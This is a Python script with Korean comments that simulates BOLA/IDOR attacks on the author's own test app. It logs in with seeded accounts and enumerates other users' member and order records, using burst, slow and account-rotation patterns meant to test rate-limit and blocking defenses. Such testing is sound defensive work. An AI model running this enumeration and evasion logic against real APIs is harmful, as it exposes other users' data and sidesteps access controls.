"""BOLA 공격 시뮬레이터: 본인 BOLA-APP에 공격 요청을 보내 탐지·판단·차단 시스템을 검증

목적: 내가 만든 탐지(fluent-bit/realtime.py)·판단(judge/judge.py)·차단(Kong + Redis)이 제대로 동작하는지 확인한다.
  공격자 계정으로 로그인한 뒤 남의 객체(members/orders 등)를 조회해서, 어디까지 성공(200)하고
  어디서 막혔는지(403)를 요청마다 CSV로 남기고 끝에 요약한다.

대상은 본인 소유의 테스트 앱이고 읽기 조회(GET)만 보낸다 (데이터를 바꾸지 않음).

세 가지 패턴 (--pattern)
  burst   1초에 1000번 (httpx 비동기)   → 10초 10회 초과 → rate 임시 차단(403)이 몇 번째에 걸리나
  steady  10초에 30번 (간격 맞춤)       → 임시 차단 경계(10초 10회) 확인
  slow    5분에 3번                     → rate엔 안 걸리지만 점수가 쌓여 100점 확정·영구 차단되나

사용법 (D:\\python-rule\\attack 에서)
  python simulate.py --pattern burst
  python simulate.py --pattern steady --attacker alice:alice123 --target members,orders
  python simulate.py --pattern slow --url https://192.168.0.39/api --victims 1-104 --stop-on-block

전제: BOLA-APP(Kong 8000), 탐지 엔진, 판단 서버가 켜져 있어야 공격→탐지→차단 흐름이 보인다.
준비: pip install httpx

이 시스템에는 429가 없다. 속도 초과도 403으로 막는다 (Kong post-function이 Redis blocked:user:<id> 키를 보고 차단).
그래서 "어디서 막혔나"는 403 중 본문이 "blocked by security policy"인 것(= Kong 차단)으로 구분한다.
"""
import argparse
import asyncio
import csv
import os
import random
import sys
import time
from collections import Counter
from datetime import datetime, timezone

try:
    import httpx
except ImportError:
    sys.exit("httpx가 필요합니다: pip install httpx")

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
RESULTS_DIR = os.path.join(BASE_DIR, "results")
DEFAULT_URL = "https://192.168.0.39/api"             # pc2 NGINX(443) → /api를 떼고 Kong(8000)으로 넘김
DEFAULT_ATTACKERS = ["alice:alice123", "bob:bob123", "carol:carol123"]   # 비밀번호를 아는 시드 계정 (02_seed.sql)
TARGETS = {                                              # 이름 → (경로 템플릿, 취약 여부)
    "members": ("/members/{id}", True),                 # 취약: 남의 것도 200 (BOLA 성공)
    "orders": ("/orders/{id}", True),                   # 취약: 남의 것도 200
    "profiles": ("/profiles/{id}", False),              # 안전: 남의 것은 403 (ATTEMPT)
    "payments": ("/payments/{id}", False),              # 안전: 남의 것은 403
}
CSV_FIELDS = ["ts_ms", "pattern", "attacker", "uri", "target_id", "status",
              "got_data", "elapsed_ms", "request_id", "label"]

# ANSI 색 (요약에만 씀). 터미널이 색을 못 받으면 NO_COLOR=1로 끄기
_USE_COLOR = sys.stdout.isatty() and os.getenv("NO_COLOR") is None
def c(text, code):
    return f"\033[{code}m{text}\033[0m" if _USE_COLOR else str(text)
RED, GRAY, YELLOW, GREEN, BOLD = "31", "90", "33", "32", "1"


def parse_victims(spec):
    """"1-104" → [1..104], "3,4,5" → [3,4,5]"""
    out = []
    for part in spec.split(","):
        part = part.strip()
        if "-" in part:
            a, b = part.split("-", 1)
            out += list(range(int(a), int(b) + 1))
        elif part:
            out.append(int(part))
    return out


def label_of(target_vulnerable, status, body_blocked):
    """상태코드 → 사람이 읽는 라벨 (차단 종류 구분)"""
    if status == 200:
        return "200-bola" if target_vulnerable else "200-own"    # 취약 API의 200 = BOLA 성공
    if status == 403:
        return "403-blocked" if body_blocked else "403-attempt"  # Kong 차단 vs 앱 소유권 거부
    if status in (401,):
        return "401-auth"
    return f"{status}"


class Attacker:
    """공격자 한 명: 로그인해 토큰을 들고, 피해자 객체를 조회"""
    def __init__(self, username, password):
        self.username, self.password = username, password
        self.user_id = None                             # 로그인 응답의 userId (자기 번호 → 피해자에서 제외)
        self.token = None
        self.token_exp = 0.0                            # 토큰 만료 예상 시각 (갱신용)

    async def login(self, client):
        """POST /auth/login → accessToken. 실패하면 예외"""
        r = await client.post("/auth/login", json={"username": self.username, "password": self.password})
        r.raise_for_status()
        data = r.json()
        self.user_id = str(data["userId"])
        self.token = data["accessToken"]
        self.token_exp = time.time() + int(data.get("expiresIn", 900)) - 30   # 만료 30초 전에 갱신
        return self

    async def ensure_token(self, client):
        if self.token is None or time.time() >= self.token_exp:
            await self.login(client)

    async def hit(self, client, pattern, path_tmpl, vulnerable, victim):
        """피해자 하나를 조회하고 결과 한 줄(dict)을 돌려줌. 네트워크 오류도 한 줄로 기록"""
        uri = path_tmpl.format(id=victim)
        await self.ensure_token(client)
        t0 = time.perf_counter()
        ts_ms = int(time.time() * 1000)
        try:
            r = await client.get(uri, headers={"Authorization": f"Bearer {self.token}"})
            elapsed = int((time.perf_counter() - t0) * 1000)
            body_blocked = False
            if r.status_code == 403:
                body_blocked = "blocked by security policy" in r.text    # Kong 차단 메시지
            got = "y" if (r.status_code == 200 and r.content) else "n"
            return {"ts_ms": ts_ms, "pattern": pattern, "attacker": self.username, "uri": uri,
                    "target_id": victim, "status": r.status_code, "got_data": got, "elapsed_ms": elapsed,
                    "request_id": r.headers.get("X-Request-ID", ""),
                    "label": label_of(vulnerable, r.status_code, body_blocked)}
        except httpx.HTTPError as err:
            elapsed = int((time.perf_counter() - t0) * 1000)
            return {"ts_ms": ts_ms, "pattern": pattern, "attacker": self.username, "uri": uri,
                    "target_id": victim, "status": 0, "got_data": "n", "elapsed_ms": elapsed,
                    "request_id": "", "label": f"error:{type(err).__name__}"}


def plan(attackers, targets, victims):
    """(공격자, 경로템플릿, 취약여부, 피해자) 목록을 순서대로 생성. 공격자 자기 번호는 피해자에서 제외"""
    jobs = []
    for atk in attackers:
        for victim in victims:
            if str(victim) == atk.user_id:              # 자기 것은 BOLA가 아님
                continue
            for name in targets:
                tmpl, vuln = TARGETS[name]
                jobs.append((atk, tmpl, vuln, victim))
    return jobs


async def run_burst(client, attackers, targets, victims, writer, stop_evt, count=1000):
    """1초에 count번: 비동기로 한꺼번에 띄움 (피해자 순서대로 돌며 count개를 채움)"""
    jobs = plan(attackers, targets, victims)
    if not jobs:
        return []
    picks = [jobs[i % len(jobs)] for i in range(count)]
    async def one(job):
        if stop_evt.is_set():
            return None
        row = await job[0].hit(client, "burst", job[1], job[2], job[3])
        writer(row)
        if stop_evt_check(row, stop_evt):
            stop_evt.set()
        return row
    rows = await asyncio.gather(*(one(j) for j in picks))
    return [r for r in rows if r]


async def run_spaced(client, attackers, targets, victims, writer, stop_evt, total, window_sec, pattern):
    """간격을 맞춰 total번: window_sec 동안 고르게 (steady=10초 30번, slow=5분 3번)"""
    jobs = plan(attackers, targets, victims)
    if not jobs:
        return []
    gap = window_sec / total
    rows = []
    start = time.perf_counter()
    for i in range(total):
        if stop_evt.is_set():
            break
        job = jobs[i % len(jobs)]
        row = await job[0].hit(client, pattern, job[1], job[2], job[3])
        writer(row)
        rows.append(row)
        print_live(row, i + 1, total)
        if stop_evt_check(row, stop_evt):
            stop_evt.set()
            break
        target_t = start + gap * (i + 1)                # 다음 요청을 보낼 시각
        sleep = target_t - time.perf_counter()
        if sleep > 0 and i < total - 1:
            await asyncio.sleep(sleep)
    return rows


async def run_rotate(client, attackers, targets, victims, writer, stop_evt, gap_sec=0.5):
    """계정 교대 공격: 피해자마다 담당 계정이 돌아감 (alice→bob→carol→alice…).
    담당 계정이 Kong 차단(403-blocked)되면 그 피해자는 다음 계정이 이어받고,
    한번 막힌 계정은 이후 피해자에서 건너뜀. (계정 단위 차단이 분산 공격을 막는지 검증)

    예) 피해자 1→alice, 2→bob, 3→carol, 4→alice… 가다가 4에서 alice가 막히면 bob이 4를 이어받음
    확인: 아직 확정 안 된 계정은 같은 피해자를 뚫음 → 계정별 차단만으로는 분산 공격을 못 막는 한계가 드러남"""
    rows = []
    blocked_accounts = set()                            # 이번 실행에서 Kong 차단된 계정 (user_id)
    n = len(attackers)
    start_idx = 0                                       # 피해자마다 1씩 돌려 담당 계정을 바꿈
    for victim in victims:
        for offset in range(n):                         # 담당 계정부터 시작해, 막히면 다음 계정으로 교대
            atk = attackers[(start_idx + offset) % n]
            if str(victim) == atk.user_id or atk.user_id in blocked_accounts:
                continue                                # 자기 번호거나, 이미 막힌 계정은 건너뜀
            account_blocked = False
            for name in targets:
                tmpl, vuln = TARGETS[name]
                row = await atk.hit(client, "rotate", tmpl, vuln, victim)
                writer(row)
                rows.append(row)
                print_live(row, len(rows), f"피해자 {victim} / {atk.username}")
                if row["label"] == "403-blocked":       # 이 계정이 막힘 → 이 피해자는 다음 계정이 이어받음
                    blocked_accounts.add(atk.user_id)
                    account_blocked = True
                    print(f"        >> {atk.username} 차단됨 -> 다음 계정이 피해자 {victim} 이어받음", flush=True)
                    break
                if gap_sec:
                    await asyncio.sleep(gap_sec)
            if not account_blocked:                     # 담당(또는 이어받은) 계정이 안 막히고 끝냄 → 다음 피해자로
                break
        start_idx += 1                                  # 다음 피해자는 다음 계정이 담당
    return rows


def stop_evt_check(row, stop_evt):
    """--stop-on-block이 켜져 있고(stop_evt가 쓰일 때) 이 요청이 Kong 차단이면 True"""
    return getattr(stop_evt, "on_block", False) and row["label"] == "403-blocked"


def print_live(row, i, total):
    """steady·slow·rotate는 느려서 요청마다 한 줄 (색 없음, 요약만 색). total은 숫자 또는 설명 문자열"""
    pos = f"{i:>4}/{total}" if isinstance(total, int) else f"{i:>4} {total}"
    print(f"  [{pos}] {row['attacker']:>6} {row['uri']:<22} "
          f"{row['status']:>3} {row['label']:<12} req={row['request_id'][:8]}")


def summarize(pattern, rows, elapsed):
    """끝난 뒤 요약: 상태코드별 건수, 첫 차단 시점, 이후 차단 유지 (색은 여기서만)"""
    if not rows:
        print("보낸 요청이 없습니다 (피해자가 공격자 자신뿐이거나 대상이 비었습니다)")
        return
    rows = sorted(rows, key=lambda r: r["ts_ms"])
    labels = Counter(r["label"] for r in rows)
    bola = labels["200-bola"]
    kong_block = labels["403-blocked"]
    attempt = labels["403-attempt"]
    t0 = rows[0]["ts_ms"]
    print()
    print(c(f"[{pattern}] 공격자 {', '.join(sorted({r['attacker'] for r in rows}))} "
            f"→ 총 {len(rows)}건, {elapsed:.1f}초", BOLD))
    print("  " + c(f"200 (BOLA 성공)       : {bola}건", RED))
    print("  " + c(f"403 (Kong 차단)       : {kong_block}건", GRAY))
    print(f"  403 (앱 거부/ATTEMPT) : {attempt}건")
    other = {k: v for k, v in labels.items() if k not in ("200-bola", "403-blocked", "403-attempt")}
    if other:
        print("  " + c(f"그 밖               : {dict(other)}", YELLOW))

    # 첫 Kong 차단 시점과 이후 차단 유지 여부
    first = next((i for i, r in enumerate(rows) if r["label"] == "403-blocked"), None)
    if first is None:
        print("  " + c("Kong 차단 없음 (한 번도 막히지 않음)", YELLOW))
    else:
        r = rows[first]
        print("  " + c(f"첫 차단: {first + 1}번째 요청, 시작 후 {(r['ts_ms'] - t0) / 1000:.1f}초", GRAY))
        after = rows[first:]
        blocked_after = sum(1 for x in after if x["label"] == "403-blocked")
        got_after = sum(1 for x in after if x["label"] == "200-bola")
        mark = c("차단 유지 ✓", GREEN) if got_after == 0 else c(f"차단 뚫림: 이후 200이 {got_after}건 ✗", RED)
        print(f"  차단 이후: {len(after)}건 중 {blocked_after}건 막힘 ({mark})")
    victims_hit = sorted({r["target_id"] for r in rows if r["label"] == "200-bola"})
    if victims_hit:
        head = victims_hit[:15]
        print(f"  털린 피해자 {len(victims_hit)}명: {head}{' …' if len(victims_hit) > 15 else ''}")
    if pattern == "rotate":
        summarize_rotate(rows)


def summarize_rotate(rows):
    """rotate 전용: 계정별 성공/차단, 피해자별로 어느 계정이 이어받았는지"""
    print()
    print(c("  [계정 교대 결과]", BOLD))
    accounts = sorted({r["attacker"] for r in rows})
    for a in accounts:
        mine = [r for r in rows if r["attacker"] == a]
        bola = sum(1 for r in mine if r["label"] == "200-bola")
        blocked = sum(1 for r in mine if r["label"] == "403-blocked")
        state = c("차단됨", GRAY) if blocked else c("안 막힘", GREEN)
        print(f"    {a:>6}: BOLA 성공 {bola}건, Kong 차단 {blocked}건 → {state}")
    # 피해자마다 거쳐 간 계정 순서 (중복 공격이 어디까지 이어졌나)
    by_victim = {}
    for r in rows:
        by_victim.setdefault(r["target_id"], []).append((r["attacker"], r["label"]))
    multi = {v: seq for v, seq in by_victim.items() if len({a for a, _ in seq}) > 1}
    if multi:
        print(c(f"  여러 계정이 노린 피해자 {len(multi)}명 (차단 → 교대):", YELLOW))
        for v in sorted(multi, key=lambda v: int(v) if str(v).isdigit() else 0)[:10]:
            chain = " → ".join(f"{a}({'막힘' if l == '403-blocked' else '성공' if l == '200-bola' else l})"
                               for a, l in multi[v])
            print(f"    피해자 {v}: {chain}")


async def main_async(args):
    attackers = [Attacker(*a.split(":", 1)) for a in args.attacker]
    victims = parse_victims(args.victims)
    if args.random:                                     # 피해자 번호를 무작위 순서로 (순차 열거 아님)
        rng = random.Random(args.seed)                  # --seed를 주면 같은 순서를 다시 만듦
        rng.shuffle(victims)
    targets = args.target.split(",")
    for tname in targets:
        if tname not in TARGETS:
            sys.exit(f"알 수 없는 대상: {tname} (가능: {', '.join(TARGETS)})")

    os.makedirs(RESULTS_DIR, exist_ok=True)
    stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    csv_path = os.path.join(RESULTS_DIR, f"{args.pattern}_{stamp}.csv")
    f = open(csv_path, "w", newline="", encoding="utf-8")
    cw = csv.DictWriter(f, fieldnames=CSV_FIELDS)
    cw.writeheader()
    lock = asyncio.Lock()
    rows_all = []
    def writer(row):                                    # CSV 한 줄 + 메모리 보관 (burst는 동시 호출이라 간단 락)
        cw.writerow(row)
        rows_all.append(row)
    stop_evt = asyncio.Event()
    stop_evt.on_block = args.stop_on_block

    limits = httpx.Limits(max_connections=args.concurrency, max_keepalive_connections=args.concurrency)
    async with httpx.AsyncClient(base_url=args.url, timeout=args.timeout, limits=limits, verify=False) as client:
        try:
            await asyncio.gather(*(a.login(client) for a in attackers))
        except httpx.HTTPError as err:
            f.close()
            sys.exit(f"로그인 실패 ({err}). --url과 계정(--attacker user:pass)을 확인하세요. 대상 앱이 켜져 있나요?")
        print(f"공격자 {len(attackers)}명 로그인됨: "
              + ", ".join(f"{a.username}(id={a.user_id})" for a in attackers))
        order = f"무작위 순서{f' (seed {args.seed})' if args.seed is not None else ''}" if args.random else "순차"
        print(f"대상 {targets}, 피해자 {len(victims)}명 ({order}), URL {args.url}")
        print(f"CSV → {csv_path}\n")

        start = time.perf_counter()
        if args.pattern == "burst":
            await run_burst(client, attackers, targets, victims, writer, stop_evt, count=args.count)
        elif args.pattern == "steady":
            await run_spaced(client, attackers, targets, victims, writer, stop_evt,
                             total=args.count or 30, window_sec=10, pattern="steady")
        elif args.pattern == "slow":
            await run_spaced(client, attackers, targets, victims, writer, stop_evt,
                             total=args.count or 3, window_sec=300, pattern="slow")
        elif args.pattern == "rotate":
            await run_rotate(client, attackers, targets, victims, writer, stop_evt, gap_sec=args.gap)
        elapsed = time.perf_counter() - start
    f.close()
    summarize(args.pattern, rows_all, elapsed)
    print(f"\nCSV 저장됨: {csv_path}")


def main():
    for stream in (sys.stdout, sys.stderr):
        if hasattr(stream, "reconfigure"):
            stream.reconfigure(encoding="utf-8")
    p = argparse.ArgumentParser(description="BOLA 공격 시뮬레이터 (본인 앱 탐지·차단 검증용)")
    p.add_argument("--pattern", required=True, choices=["burst", "steady", "slow", "rotate"],
                   help="burst(1초 1000번), steady(10초 30번), slow(5분 3번), rotate(계정 교대: 차단되면 다음 계정이 이어받음)")
    p.add_argument("--url", default=DEFAULT_URL, help=f"Kong 주소 (기본 {DEFAULT_URL})")
    p.add_argument("--attacker", action="append", metavar="user:pass",
                   help="공격자 계정, 여러 번 가능 (기본: alice/bob/carol)")
    p.add_argument("--target", default="members,orders,profiles,payments",
                   help="공격 대상, 쉼표로 (members,orders,profiles,payments 중)")
    p.add_argument("--victims", default="1-104", help="피해자 범위 (예: 1-104 또는 3,4,5)")
    p.add_argument("--count", type=int, default=0, help="요청 수 (burst 기본 1000, steady 30, slow 3)")
    p.add_argument("--stop-on-block", action="store_true", help="첫 Kong 차단(403)에서 멈춤")
    p.add_argument("--concurrency", type=int, default=200, help="burst 동시 연결 수 (기본 200)")
    p.add_argument("--timeout", type=float, default=10.0, help="요청 타임아웃 초 (기본 10)")
    p.add_argument("--gap", type=float, default=0.5, help="rotate: 요청 사이 간격 초 (기본 0.5)")
    p.add_argument("--random", action="store_true", help="피해자 번호를 무작위 순서로 (순차 열거 대신)")
    p.add_argument("--seed", type=int, default=None, help="--random 순서를 재현 (같은 seed = 같은 순서)")
    args = p.parse_args()
    if not args.attacker:
        args.attacker = DEFAULT_ATTACKERS
    if args.pattern == "burst" and not args.count:
        args.count = 1000
    try:
        asyncio.run(main_async(args))
    except KeyboardInterrupt:
        print("\n중단됨")


if __name__ == "__main__":
    main()
